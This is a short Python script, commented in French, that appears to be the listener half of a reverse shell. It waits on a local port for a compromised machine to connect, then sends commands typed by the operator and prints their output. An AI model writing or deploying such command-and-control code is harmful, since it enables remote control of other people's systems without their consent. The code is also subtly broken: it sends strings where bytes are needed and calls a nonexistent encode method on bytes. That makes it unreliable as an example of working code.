import socket, subprocess as sp, sys

#host = sys.argv[1]
host = "127.0.0.1"
#port = int(sys.argv[2])
port = 8000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()

print(f"[+] connexion etablie avec l hote : {addr}")

while 1:
    command = input("#> ")
    if command != "exit()":
        if command == "":
            continue

        conn.send(command)
        result = conn.recv(1024)

        total_size = bytes(result[:16]).encode()

        while total_size > len(result):
            data = conn.recv(1024)
            result += data
        print(result.rstrip("\n"))

    else: 
        conn.send("exit()")
        print("[+] Connexion fermer")
        break
s.close()

